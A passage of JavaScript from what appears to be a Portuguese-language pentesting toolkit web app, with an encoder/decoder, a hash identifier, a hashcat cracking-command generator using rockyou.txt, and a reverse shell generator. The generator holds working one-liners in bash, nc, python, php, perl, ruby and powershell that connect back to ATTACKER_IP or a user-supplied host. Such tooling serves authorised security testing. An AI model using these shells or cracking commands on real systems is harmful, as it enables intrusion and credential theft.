                const trialEnd = new Date(trialEndsAt);
                if (trialEnd > new Date()) return true;
            }
            
            return false;
        }
        
        function showUpgradeModal() {
            const modal = document.getElementById('upgradeModal');
            if (modal) {
                modal.classList.remove('hidden');
                modal.classList.add('flex');
            } else {
                showNotification('Faça upgrade para acessar ferramentas Pro!', 'warning');
                window.location.href = '/profile#plans';
            }
        }
        
        function closeUpgradeModal() {
            const modal = document.getElementById('upgradeModal');
            modal.classList.add('hidden');
            modal.classList.remove('flex');
        }
        
        // Decoder/Encoder Modal
        function openDecoderModal() {
            const modal = document.getElementById('decoderModal');
            modal.classList.remove('hidden');
            modal.classList.add('flex');
        }
        
        function closeDecoderModal() {
            const modal = document.getElementById('decoderModal');
            modal.classList.add('hidden');
            modal.classList.remove('flex');
        }
        
        function decodeEncode(action) {
            const input = document.getElementById('decoderInput').value;
            const type = document.getElementById('decoderType').value;
            let result = '';
            
            try {
                if (action === 'encode') {
                    switch(type) {
                        case 'base64': result = btoa(input); break;
                        case 'url': result = encodeURIComponent(input); break;
                        case 'html': result = input.replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m])); break;
                        case 'hex': result = input.split('').map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join(''); break;
                        case 'unicode': result = input.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4,'0')).join(''); break;
                    }
                } else {
                    switch(type) {
                        case 'base64': result = atob(input); break;
                        case 'url': result = decodeURIComponent(input); break;
                        case 'html': result = input.replace(/&amp;|&lt;|&gt;|&quot;|&#39;/g, m => ({'&amp;':'&','&lt;':'<','&gt;':'>','&quot;':'"','&#39;':"'"}[m])); break;
                        case 'hex': result = input.match(/.{2}/g)?.map(h => String.fromCharCode(parseInt(h,16))).join('') || ''; break;
                        case 'unicode': result = input.replace(/\\u[\dA-Fa-f]{4}/g, m => String.fromCharCode(parseInt(m.slice(2),16))); break;
                    }
                }
                document.getElementById('decoderOutput').value = result;
            } catch(e) {
                showNotification('Erro ao processar: ' + e.message, 'error');
            }
        }
        
        function copyDecoderOutput() {
            const output = document.getElementById('decoderOutput').value;
            navigator.clipboard.writeText(output).then(() => showNotification('Copiado!', 'success'));
        }
        
        // Hash Modal
        function openHashModal() {
            const modal = document.getElementById('hashModal');
            modal.classList.remove('hidden');
            modal.classList.add('flex');
        }
        
        function closeHashModal() {
            const modal = document.getElementById('hashModal');
            modal.classList.add('hidden');
            modal.classList.remove('flex');
        }
        
        async function identifyHash() {
            const hash = document.getElementById('hashInput').value.trim();
            if (!hash) { showNotification('Digite um hash', 'error'); return; }
            
            const results = [];
            const len = hash.length;
            
            // Identificação por tamanho e padrão
            if (len === 32 && /^[a-f0-9]+$/i.test(hash)) results.push('MD5', 'NTLM');
            if (len === 40 && /^[a-f0-9]+$/i.test(hash)) results.push('SHA-1');
            if (len === 64 && /^[a-f0-9]+$/i.test(hash)) results.push('SHA-256');
            if (len === 128 && /^[a-f0-9]+$/i.test(hash)) results.push('SHA-512');
            if (hash.startsWith('$2a$') || hash.startsWith('$2b$') || hash.startsWith('$2y$')) results.push('bcrypt');
            if (hash.startsWith('$6$')) results.push('SHA-512 Crypt (Linux)');
            if (hash.startsWith('$5$')) results.push('SHA-256 Crypt (Linux)');
            if (hash.startsWith('$1$')) results.push('MD5 Crypt (Linux)');
            if (hash.startsWith('$apr1$')) results.push('Apache MD5');
            if (/^[a-f0-9]{32}:[a-f0-9]+$/i.test(hash)) results.push('MD5 + Salt');
            
            const output = document.getElementById('hashOutput');
            if (results.length > 0) {
                output.innerHTML = '<div class="text-green-400 mb-2">Possíveis tipos:</div>' + 
                    results.map(r => `<div class="text-cyan-400">• ${r}</div>`).join('');
            } else {
                output.innerHTML = '<div class="text-yellow-400">Tipo não identificado. Tente usar hashcat --identify ou hash-identifier.</div>';
            }
        }
        
        function generateHashcatCmd() {
            const hash = document.getElementById('hashInput').value.trim();
            const hashType = document.getElementById('hashTypeSelect').value;
            const wordlist = '/usr/share/wordlists/rockyou.txt';
            
            const cmd = `hashcat -m ${hashType} -a 0 hash.txt ${wordlist} --force`;
            document.getElementById('hashOutput').innerHTML = `
                <div class="text-gray-400 mb-2">Comando Hashcat:</div>
                <code class="text-green-400 block bg-black/50 p-2 rounded">${cmd}</code>
                <div class="text-gray-500 text-xs mt-2">Salve o hash em hash.txt antes de executar</div>
            `;
        }
        
        // Reverse Shell Modal
        function openRevshellModal() {
            const modal = document.getElementById('revshellModal');
            modal.classList.remove('hidden');
            modal.classList.add('flex');
        }
        
        function closeRevshellModal() {
            const modal = document.getElementById('revshellModal');
            modal.classList.add('hidden');
            modal.classList.remove('flex');
        }
        
        function generateRevshell() {
            const ip = document.getElementById('revshellIP').value || 'ATTACKER_IP';
            const port = document.getElementById('revshellPort').value || '4444';
            const type = document.getElementById('revshellType').value;
            
            const shells = {
                bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
                bash_udp: `bash -i >& /dev/udp/${ip}/${port} 0>&1`,
                nc: `nc -e /bin/bash ${ip} ${port}`,
                nc_mkfifo: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
                python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
                python3: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
                php: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
                perl: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
                ruby: `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
                powershell: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
            };
            
            const output = document.getElementById('revshellOutput');
            const container = document.getElementById('revshellOutputContainer');
            output.textContent = shells[type] || 'Tipo não suportado';
            container.classList.remove('hidden');
        }
        
        function copyRevshell() {
            const output = document.getElementById('revshellOutput').textContent;
            navigator.clipboard.writeText(output).then(() => showNotification('Copiado!', 'success'));
        }
        
        async function init() {
            // Verifica se foi redirecionado por falta de autenticação
            const urlParams = new URLSearchParams(window.location.search);
            const loginRequired = urlParams.get('login') === 'required';
            
            if (token) {
                try {
                    const data = await api('/auth/me');
                    currentUser = data.data;
                    onAuthSuccess();
                } catch (error) {
                    localStorage.removeItem('token');
                    token = null;
                    showAuthModal(loginRequired);
                }
            } else {
                showAuthModal(loginRequired);
            }
            
            // Limpa o parâmetro da URL
            if (loginRequired) {
                window.history.replaceState({}, document.title, window.location.pathname);
            }
        }
        
        function showAuthModal(showMessage = false) {
            authModal.classList.remove('hidden');
            authModal.classList.add('flex');
            
            // Mostra mensagem se foi redirecionado
            if (showMessage) {
                showAuthError('Faça login para acessar esta funcionalidade');
            }
        }
        
        init();
        
        // Mostra página quando estiver pronta (evita flash)
        document.documentElement.classList.add('page-ready');
    </script>
</body>
</html>